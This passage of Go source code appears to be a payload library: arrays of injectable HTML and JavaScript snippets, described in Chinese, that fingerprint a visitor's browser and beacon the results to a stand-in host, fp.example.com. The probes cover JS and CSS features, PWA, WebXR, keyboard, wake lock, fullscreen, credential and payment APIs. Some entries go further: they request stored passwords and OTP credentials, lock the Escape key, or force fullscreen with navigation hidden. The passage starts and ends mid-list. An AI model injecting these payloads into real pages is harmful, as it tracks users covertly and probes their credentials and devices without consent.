	{Raw: `<script>try{eval('var t=Boolean(1)??Boolean(2)');new Image().src='//fp.example.com/js9?nullish=1';}catch(e){new Image().src='//fp.example.com/js9?nullish=0';}</script>`, Description: "JS-nullish合并", FPType: FingerprintHardware},
	{Raw: `<script>try{eval('var o=window?.document?.title');new Image().src='//fp.example.com/js10?opt=1';}catch(e){new Image().src='//fp.example.com/js10?opt=0';}</script>`, Description: "JS-可选链", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js11?bl='+(typeof BigInt!=='undefined'?'1':'0')+'&flat='+(typeof [].flat==='function'?'1':'0');</script>`, Description: "JS-BigInt/flat", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js12?obj='+(typeof Object.fromEntries==='function'?'1':'0')+'&trim='+(typeof ''.trimStart==='function'?'1':'0');</script>`, Description: "JS-fromEntries/trimStart", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js13?allS='+(typeof Promise.allSettled==='function'?'1':'0')+'&any='+(typeof Promise.any==='function'?'1':'0');</script>`, Description: "JS-Promise.allSettled/any", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js14?match='+(typeof ''.matchAll==='function'?'1':'0')+'&desc='+(typeof Object.getOwnPropertyDescriptors==='function'?'1':'0');</script>`, Description: "JS-matchAll/descriptors", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js15?log='+(typeof console.log==='function'?'1':'0')+'&tbl='+(typeof console.table==='function'?'1':'0');</script>`, Description: "JS-console高级方法", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js16?at='+(typeof Atomics!=='undefined'?'1':'0')+'&sab='+(typeof SharedArrayBuffer!=='undefined'?'1':'0');</script>`, Description: "JS-Atomics/SharedArrayBuffer", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js17?te='+(typeof TextEncoder!=='undefined'?'1':'0')+'&td='+(typeof TextDecoder!=='undefined'?'1':'0');</script>`, Description: "JS-TextEncoder/Decoder", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js18?ws='+(typeof WeakSet!=='undefined'?'1':'0')+'&wm='+(typeof WeakMap!=='undefined'?'1':'0');</script>`, Description: "JS-WeakSet/WeakMap", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js19?tdz='+(typeof DataView!=='undefined'?'1':'0')+'&ab='+(typeof ArrayBuffer!=='undefined'?'1':'0');</script>`, Description: "JS-DataView/ArrayBuffer", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/js20?sets='+(typeof Set.prototype.symmetricDifference==='function'?'1':'0')+'&group='+(typeof Map.groupBy==='function'?'1':'0');</script>`, Description: "JS-Set新方法/Map.groupBy", FPType: FingerprintHardware},
}

var fingerprintCSSFeatures = []Payload{
	{Raw: `<style>@supports(display:flex){html{--fp-flex:1}}</style><script>var flex=CSS.supports('display','flex')||getComputedStyle(document.documentElement).getPropertyValue('--fp-flex');new Image().src='//fp.example.com/css2?flex='+(flex?'1':'0');</script>`, Description: "CSS-Flex支持", FPType: FingerprintScreen},
	{Raw: `<style>@supports(gap:1px){html{--fp-gap:1}}</style><script>var gap=getComputedStyle(document.documentElement).getPropertyValue('--fp-gap');new Image().src='//fp.example.com/css3?gap='+(gap?'1':'0');</script>`, Description: "CSS-Gap支持", FPType: FingerprintScreen},
	{Raw: `<style>@supports(backdrop-filter:blur(1px)){html{--fp-bf:1}}</style><script>var bf=getComputedStyle(document.documentElement).getPropertyValue('--fp-bf');new Image().src='//fp.example.com/css4?bf='+(bf?'1':'0');</script>`, Description: "CSS-backdrop-filter", FPType: FingerprintScreen},
	{Raw: `<style>@supports(scroll-behavior:smooth){html{--fp-sb:1}}</style><script>var sb=getComputedStyle(document.documentElement).getPropertyValue('--fp-sb');new Image().src='//fp.example.com/css5?sb='+(sb?'1':'0');</script>`, Description: "CSS-scroll-behavior", FPType: FingerprintScreen},
	{Raw: `<style>@supports(contain:paint){html{--fp-cont:1}}</style><script>var cont=getComputedStyle(document.documentElement).getPropertyValue('--fp-cont');new Image().src='//fp.example.com/css6?cont='+(cont?'1':'0');</script>`, Description: "CSS-contain", FPType: FingerprintScreen},
	{Raw: `<style>@supports(position:sticky){html{--fp-sticky:1}}</style><script>var sticky=getComputedStyle(document.documentElement).getPropertyValue('--fp-sticky');new Image().src='//fp.example.com/css7?sticky='+(sticky?'1':'0');</script>`, Description: "CSS-sticky", FPType: FingerprintScreen},
	{Raw: `<style>@supports(clip-path:circle(50%)){html{--fp-clip:1}}</style><script>var clip=getComputedStyle(document.documentElement).getPropertyValue('--fp-clip');new Image().src='//fp.example.com/css8?clip='+(clip?'1':'0');</script>`, Description: "CSS-clip-path", FPType: FingerprintScreen},
	{Raw: `<style>@supports(mix-blend-mode:multiply){html{--fp-mix:1}}</style><script>var mix=getComputedStyle(document.documentElement).getPropertyValue('--fp-mix');new Image().src='//fp.example.com/css9?mix='+(mix?'1':'0');</script>`, Description: "CSS-mix-blend-mode", FPType: FingerprintScreen},
	{Raw: `<style>@supports(filter:grayscale(1)){html{--fp-flt:1}}</style><script>var flt=getComputedStyle(document.documentElement).getPropertyValue('--fp-flt');new Image().src='//fp.example.com/css10?flt='+(flt?'1':'0');</script>`, Description: "CSS-filter", FPType: FingerprintScreen},
	{Raw: `<style>@supports(mask-image:url('')){html{--fp-mask:1}}</style><script>var mask=getComputedStyle(document.documentElement).getPropertyValue('--fp-mask');new Image().src='//fp.example.com/css11?mask='+(mask?'1':'0');</script>`, Description: "CSS-mask", FPType: FingerprintScreen},
	{Raw: `<style>@supports(isolation:isolate){html{--fp-iso:1}}</style><script>var iso=getComputedStyle(document.documentElement).getPropertyValue('--fp-iso');new Image().src='//fp.example.com/css12?iso='+(iso?'1':'0');</script>`, Description: "CSS-isolation", FPType: FingerprintScreen},
	{Raw: `<style>@supports(subgrid:true){html{--fp-sub:1}}</style><script>var sub=getComputedStyle(document.documentElement).getPropertyValue('--fp-sub');new Image().src='//fp.example.com/css13?sub='+(sub?'1':'0');</script>`, Description: "CSS-subgrid", FPType: FingerprintScreen},
	{Raw: `<style>@supports(container-type:inline-size){html{--fp-cq:1}}</style><script>var cq=getComputedStyle(document.documentElement).getPropertyValue('--fp-cq');new Image().src='//fp.example.com/css14?cq='+(cq?'1':'0');</script>`, Description: "CSS-container-queries", FPType: FingerprintScreen},
	{Raw: `<style>@supports(animation-timeline:scroll()){html{--fp-atl:1}}</style><script>var atl=getComputedStyle(document.documentElement).getPropertyValue('--fp-atl');new Image().src='//fp.example.com/css15?atl='+(atl?'1':'0');</script>`, Description: "CSS-scroll-animations", FPType: FingerprintScreen},
}

var fingerprintProgressiveWeb = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/pwa?man='+('manifest' in document.createElement('link')?'1':'0')+'&meta='+(document.querySelector('meta[name=theme-color]')?'1':'0');</script>`, Description: "PWA-Manifest", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/pwa2?sw='+('serviceWorker' in navigator?'1':'0')+'&install='+(window.onappinstalled!==undefined?'1':'0');</script>`, Description: "PWA-安装支持", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa3?bfcache='+('onpageshow' in window?'1':'0')+'&add='+(window.addEventListener?'1':'0');</script>`, Description: "PWA-BFCache支持", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa4?stand='+(window.navigator.standalone?'1':'0')+'&mode='+(window.matchMedia('(display-mode: standalone)').matches?'1':'0');</script>`, Description: "PWA-独立模式检测", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/pwa5?cache='+('caches' in window?'1':'0')+'&sync='+('SyncManager' in window?'1':'0');</script>`, Description: "PWA-Cache API检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa6?bgSync='+('SyncManager' in window?'1':'0')+'&periodic='+('PeriodicSyncManager' in window?'1':'0');</script>`, Description: "PWA-后台同步", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa7?webShare='+(navigator.share?'1':'0')+'&target='+(navigator.shareTarget?'1':'0');</script>`, Description: "PWA-Web Share", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa8?badge='+('setAppBadge' in navigator?'1':'0')+'&clear='+('clearAppBadge' in navigator?'1':'0');</script>`, Description: "PWA-App Badge", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa9?installed='+(window.matchMedia('(display-mode: standalone)').matches||window.navigator.standalone?'1':'0');</script>`, Description: "PWA-已安装检测", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/pwa10?rel='+(navigator.connection?'1':'0')+'&save='+(navigator.connection&&navigator.connection.saveData?'1':'0');</script>`, Description: "PWA-保存数据模式", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa11?fsc='+(document.fullscreenEnabled?'1':'0')+'&vis='+document.visibilityState;</script>`, Description: "PWA-全屏/可见性", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/pwa12?start='+(window.location.protocol==='https:'?'1':'0')+'&scope='+encodeURIComponent(window.location.pathname);</script>`, Description: "PWA-HTTPS/路径", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/pwa13?reg='+(navigator.getInstalledRelatedApps?'1':'0');</script>`, Description: "PWA-关联应用检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa14?beforeIn='+(window.onbeforeinstallprompt!==undefined?'1':'0');</script>`, Description: "PWA-安装提示事件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pwa15?contentIndex='+('ContentIndex' in window?'1':'0');</script>`, Description: "PWA-Content Indexing", FPType: FingerprintPlugin},
}

var fingerprintXR = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/xr?vr='+(navigator.xr?'1':'0')+'&ar='+(navigator.xr&&navigator.xr.isSessionSupported?'1':'0');</script>`, Description: "XR-WebXR API", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.xr){navigator.xr.isSessionSupported('immersive-vr').then(function(s){new Image().src='//fp.example.com/xr2?vr='+(s?'1':'0');});navigator.xr.isSessionSupported('immersive-ar').then(function(s){new Image().src='//fp.example.com/xr3?ar='+(s?'1':'0');});}</script>`, Description: "XR-VR/AR会话支持", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr4?inline='+(navigator.xr&&navigator.xr.isSessionSupported?1:0)+'&gpu='+(navigator.gpu?'1':'0');</script>`, Description: "XR-WebGPU关联", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr5?gamepad='+(navigator.getGamepads?'1':'0')+'&keyboard='+(navigator.keyboard?'1':'0');</script>`, Description: "XR-手柄/键盘", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr6?dev='+(navigator.xr?navigator.xr.requestDevice?'1':'0':'0');</script>`, Description: "XR-设备请求", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr7?sp='+(navigator.xr&&navigator.xr.requestSession?'1':'0');</script>`, Description: "XR-会话请求", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr8?sys='+(XRSystem?'1':'0')+'&ref='+(XRReferenceSpace?'1':'0');</script>`, Description: "XR-构造函数检测", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr9?hand='+(navigator.xr&&navigator.xr.isSessionSupported?'1':'0');</script>`, Description: "XR-Hand Tracking", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr10?test='+(navigator.xr&&navigator.xr.isSessionSupported?'1':'0')+'&hit='+(XRHitTestSource?'1':'0');</script>`, Description: "XR-Hit Test", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr11?layer='+(XRLayer?'1':'0')+'&proj='+(XRWebGLLayer?'1':'0');</script>`, Description: "XR-Layer类型", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr12?anchor='+(XRAnchor?'1':'0')+'&plane='+(XRPlane?'1':'0');</script>`, Description: "XR-锚点/平面", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr13?depth='+(XRDepthInformation?'1':'0')+'&light='+(XRLightEstimate?'1':'0');</script>`, Description: "XR-深度/光线估计", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/xr14?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'xr-spatial-tracking'}).then(function(s){new Image().src='//fp.example.com/xr15?state='+s.state;})}</script>`, Description: "XR-权限查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/xr16?gpu='+(navigator.gpu?'1':'0')+'&webgl='+(document.createElement('canvas').getContext('webgl2')?'2':'1');</script>`, Description: "XR-GPU/WebGL能力", FPType: FingerprintHardware},
}

var fingerprintKeyboard = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/kbd?layout='+(navigator.keyboard?navigator.keyboard.getLayoutMap?'supported':'api':'none');</script>`, Description: "键盘-布局API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd2?api='+(navigator.keyboard?'1':'0')+'&lock='+(navigator.keyboard&&navigator.keyboard.lock?'1':'0');</script>`, Description: "键盘-锁API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd3?show='+(navigator.keyboard&&navigator.keyboard.show?'1':'0')+'&hide='+(navigator.keyboard&&navigator.keyboard.hide?'1':'0');</script>`, Description: "键盘-显示/隐藏", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd4?map='+(navigator.keyboard&&navigator.keyboard.getLayoutMap?'1':'0');</script>`, Description: "键盘-布局映射", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.keyboard.getLayoutMap().then(function(m){new Image().src='//fp.example.com/kbd5?qwerty='+(m.has('KeyQ')?'1':'0')+'&azerty='+(m.has('KeyA')?'1':'0');})}catch(e){}</script>`, Description: "键盘-QWERTY检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd6?lock='+(navigator.keyboard&&navigator.keyboard.lock?'1':'0');</script>`, Description: "键盘-锁定能力", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.keyboard.lock(['Escape']);new Image().src='//fp.example.com/kbd7?locked=1';}catch(e){new Image().src='//fp.example.com/kbd7?locked=0';}</script>`, Description: "键盘-锁定Escape", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd8?event='+(typeof KeyboardEvent!=='undefined'?'1':'0')+'&code='+(KeyboardEvent.prototype.code?'1':'0');</script>`, Description: "键盘-事件API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd9?key='+(KeyboardEvent.prototype.key?'1':'0')+'&loc='+(KeyboardEvent.prototype.location?'1':'0');</script>`, Description: "键盘-key/location", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd10?repeat='+(KeyboardEvent.prototype.repeat?'1':'0')+'&iso='+(KeyboardEvent.prototype.isComposing?'1':'0');</script>`, Description: "键盘-repeat/compose", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd11?alt='+(KeyboardEvent.DOM_KEY_LOCATION_STANDARD?'1':'0')+'&numpad='+(KeyboardEvent.DOM_KEY_LOCATION_NUMPAD?'1':'0');</script>`, Description: "键盘-位置常量", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd12?vk='+(navigator.virtualKeyboard?'1':'0');</script>`, Description: "键盘-虚拟键盘API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd13?bnd='+(navigator.virtualKeyboard&&navigator.virtualKeyboard.boundingRect?'1':'0')+'&over='+(navigator.virtualKeyboard&&navigator.virtualKeyboard.overlaysContent?'1':'0');</script>`, Description: "键盘-虚拟键盘属性", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd14?input='+(typeof InputDeviceCapabilities!=='undefined'?'1':'0');</script>`, Description: "键盘-输入能力API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/kbd15?cap='+(InputDeviceCapabilities&&InputDeviceCapabilities.prototype.firesTouchEvents?'1':'0');</script>`, Description: "键盘-触控事件检测", FPType: FingerprintPlugin},
}

var fingerprintScreenWake = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/wake?s='+('wakeLock' in navigator?'1':'0');</script>`, Description: "唤醒-屏幕锁API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake2?type='+(navigator.wakeLock&&navigator.wakeLock.request?'1':'0');</script>`, Description: "唤醒-请求方法", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.wakeLock.request('screen').then(function(lock){new Image().src='//fp.example.com/wake3?screen=1';lock.release();});}catch(e){new Image().src='//fp.example.com/wake3?screen=0';}</script>`, Description: "唤醒-屏幕锁请求", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.wakeLock.request('system').then(function(lock){new Image().src='//fp.example.com/wake4?sys=1';lock.release();});}catch(e){new Image().src='//fp.example.com/wake4?sys=0';}</script>`, Description: "唤醒-系统锁请求", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake5?released='+(typeof WakeLockSentinel!=='undefined'?WakeLockSentinel.prototype.released?'1':'0':'0');</script>`, Description: "唤醒-释放检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake6?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'screen-wake-lock'}).then(function(s){new Image().src='//fp.example.com/wake7?state='+s.state;})}</script>`, Description: "唤醒-权限查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake8?sentinel='+(typeof WakeLockSentinel!=='undefined'?'1':'0');</script>`, Description: "唤醒-Sentinel检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake9?type='+(WakeLockSentinel&&WakeLockSentinel.prototype.type?'1':'0');</script>`, Description: "唤醒-type属性", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake10?onrel='+(WakeLockSentinel&&WakeLockSentinel.prototype.onrelease?'1':'0');</script>`, Description: "唤醒-事件监听", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake11?idle='+(typeof IdleDetector!=='undefined'?'1':'0');</script>`, Description: "唤醒-空闲检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake12?noSleep='+(typeof NoSleep!=='undefined'?'1':'0');</script>`, Description: "唤醒-NoSleep库检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake13?visibility='+document.visibilityState+'&hidden='+(document.hidden?'1':'0');</script>`, Description: "唤醒-页面可见性", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/wake14?anim='+(typeof requestAnimationFrame!=='undefined'?'1':'0')+'&idle='+(typeof requestIdleCallback!=='undefined'?'1':'0');</script>`, Description: "唤醒-动画/空闲回调", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/wake15?power='+(navigator.getBattery?'1':'0');</script>`, Description: "唤醒-电池API关联", FPType: FingerprintPlugin},
}

var fingerprintFullscreen = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/fs?e='+(document.fullscreenEnabled?'1':'0')+'&api='+(document.documentElement.requestFullscreen?'1':'0');</script>`, Description: "全屏-API支持", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs2?exit='+(document.exitFullscreen?'1':'0')+'&el='+(document.fullscreenElement?'1':'0');</script>`, Description: "全屏-退出/元素", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs3?webkit='+(document.documentElement.webkitRequestFullscreen?'1':'0')+'&moz='+(document.documentElement.mozRequestFullScreen?'1':'0');</script>`, Description: "全屏-前缀检测", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs4?ms='+(document.documentElement.msRequestFullscreen?'1':'0')+'&change='+('onfullscreenchange' in document?'1':'0');</script>`, Description: "全屏-MS前缀/事件", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs5?err='+('onfullscreenerror' in document?'1':'0')+'&pseudo='+(document.fullscreenElement?'1':'0');</script>`, Description: "全屏-错误/伪元素", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs6?nav='+('FullscreenOptions' in window?'1':'0')+'&opts='+(typeof FullscreenOptions!=='undefined'?1:0);</script>`, Description: "全屏-选项对象", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs7?type='+(typeof document.fullscreenElement!=='undefined'?typeof document.fullscreenElement:'na');</script>`, Description: "全屏-元素类型", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs8?kb='+(document.fullscreenEnabled&&document.documentElement.requestFullscreen?'1':'0');</script>`, Description: "全屏-键盘支持", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs9?nav='+(typeof NavigationUI!=='undefined'?'1':'0');</script>`, Description: "全屏-导航UI", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs10?or='+(screen.orientation?screen.orientation.type:'na');</script>`, Description: "全屏-屏幕方向", FPType: FingerprintScreen},
	{Raw: `<script>try{document.documentElement.requestFullscreen({navigationUI:'hide'});new Image().src='//fp.example.com/fs11?nav_ui=hide';}catch(e){new Image().src='//fp.example.com/fs11?nav_ui=na';}</script>`, Description: "全屏-导航UI隐藏", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs12?fullscreen_change='+(document.onfullscreenchange?'1':'0');</script>`, Description: "全屏-事件监听", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs13?cap='+(document.fullscreenEnabled?'1':'0')+'&mode='+(document.fullscreen?'1':'0');</script>`, Description: "全屏-能力/模式", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/fs14?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'fullscreen'}).then(function(s){new Image().src='//fp.example.com/fs15?state='+s.state;})}</script>`, Description: "全屏-权限查询", FPType: FingerprintPlugin},
}

var fingerprintCredMan = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/cred?cm='+(window.PasswordCredential?'1':'0')+'&fed='+(window.FederatedCredential?'1':'0');</script>`, Description: "凭据-API检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred2?get='+(navigator.credentials&&navigator.credentials.get?'1':'0')+'&store='+(navigator.credentials&&navigator.credentials.store?'1':'0');</script>`, Description: "凭据-get/store", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred3?create='+(navigator.credentials&&navigator.credentials.create?'1':'0')+'&prevent='+(navigator.credentials&&navigator.credentials.preventSilentAccess?'1':'0');</script>`, Description: "凭据-create/prevent", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred4?otp='+(window.OTPCredential?'1':'0')+'&publicKey='+(window.PublicKeyCredential?'1':'0');</script>`, Description: "凭据-OTP/WebAuthn", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred5?webauthn='+(PublicKeyCredential?'1':'0')+'&iso='+(PublicKeyCredential&&PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable?'1':'0');</script>`, Description: "凭据-WebAuthn支持", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred6?con='+(window.IdentityCredential?'1':'0');</script>`, Description: "凭据-FedCM API", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.credentials.get({password:true}).then(function(c){new Image().src='//fp.example.com/cred7?pw='+(c?'1':'0');});}catch(e){new Image().src='//fp.example.com/cred7?pw=err';}</script>`, Description: "凭据-密码凭据", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.credentials.get({federated:{providers:['https://example.com']}}).then(function(c){new Image().src='//fp.example.com/cred8?fed='+(c?'1':'0');});}catch(e){new Image().src='//fp.example.com/cred8?fed=err';}</script>`, Description: "凭据-联合凭据", FPType: FingerprintPlugin},
	{Raw: `<script>try{navigator.credentials.get({otp:{transport:['sms']}}).then(function(c){new Image().src='//fp.example.com/cred9?otp='+(c?'1':'0');});}catch(e){new Image().src='//fp.example.com/cred9?otp=err';}</script>`, Description: "凭据-OTP凭据", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred10?platform='+(PublicKeyCredential&&PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable?'1':'0');</script>`, Description: "凭据-平台认证器", FPType: FingerprintPlugin},
	{Raw: `<script>try{PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable().then(function(r){new Image().src='//fp.example.com/cred11?uvpa='+(r?'1':'0');});}catch(e){}</script>`, Description: "凭据-UVPA检查", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred12?con='+(PublicKeyCredential&&PublicKeyCredential.isConditionalMediationAvailable?'1':'0');</script>`, Description: "凭据-条件中介", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred13?dig='+(window.DigitalCredential?'1':'0');</script>`, Description: "凭据-数字身份", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred14?fedcm='+(navigator.credentials&&navigator.credentials.get?'1':'0');</script>`, Description: "凭据-FedCM基础", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/cred15?navigator='+(navigator.credentials?'1':'0');</script>`, Description: "凭据-全局检测", FPType: FingerprintPlugin},
}

var fingerprintPayment = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/pay?pr='+(window.PaymentRequest?'1':'0')+'&pm='+(navigator.paymentManager?'1':'0');</script>`, Description: "支付-API检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay2?show='+(PaymentRequest&&PaymentRequest.prototype.show?'1':'0')+'&abort='+(PaymentRequest&&PaymentRequest.prototype.abort?'1':'0');</script>`, Description: "支付-show/abort", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay3?canMake='+(PaymentRequest&&PaymentRequest.prototype.canMakePayment?'1':'0')+'&hasEnr='+(PaymentRequest&&PaymentRequest.prototype.hasEnrolledInstrument?'1':'0');</script>`, Description: "支付-canMake/hasEnrolled", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay4?apple='+(window.ApplePaySession?'1':'0')+'&google='+(window.PaymentRequest?'1':'0');</script>`, Description: "支付-Apple/Google Pay", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay5?handler='+(window.PaymentHandlerWindow?'1':'0')+'&manager='+(navigator.paymentManager?'1':'0');</script>`, Description: "支付-Handler/Manager", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay6?addr='+(PaymentAddress?'1':'0')+'&response='+(PaymentResponse?'1':'0');</script>`, Description: "支付-地址/响应", FPType: FingerprintPlugin},
	{Raw: `<script>try{var req=new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'test',amount:{currency:'USD',value:'0'}}});new Image().src='//fp.example.com/pay7?method=basic-card';}catch(e){new Image().src='//fp.example.com/pay7?method=na';}</script>`, Description: "支付-basic-card方法", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay8?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'payment-handler'}).then(function(s){new Image().src='//fp.example.com/pay9?state='+s.state;})}</script>`, Description: "支付-权限查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay10?change='+(PaymentRequest&&PaymentRequest.prototype.onpaymentmethodchange?'1':'0');</script>`, Description: "支付-方法变更事件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay11?merchant='+(PaymentRequest&&PaymentRequest.prototype.onmerchantvalidation?'1':'0');</script>`, Description: "支付-商户验证", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay12?shipping='+(PaymentRequest&&PaymentRequest.prototype.onshippingaddresschange?'1':'0')+'&option='+(PaymentRequest&&PaymentRequest.prototype.onshippingoptionchange?'1':'0');</script>`, Description: "支付-收货事件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay13?details='+(PaymentRequest&&PaymentRequest.prototype.details?'1':'0');</script>`, Description: "支付-详情更新", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay14?enc='+(PaymentRequest&&PaymentRequest.prototype.onencryptedcarddata?'1':'0');</script>`, Description: "支付-加密卡数据", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pay15?id='+(PaymentRequest&&PaymentRequest.prototype.id?'1':'0');</script>`, Description: "支付-ID属性", FPType: FingerprintPlugin},
}

var fingerprintOpenSearch = []Payload{
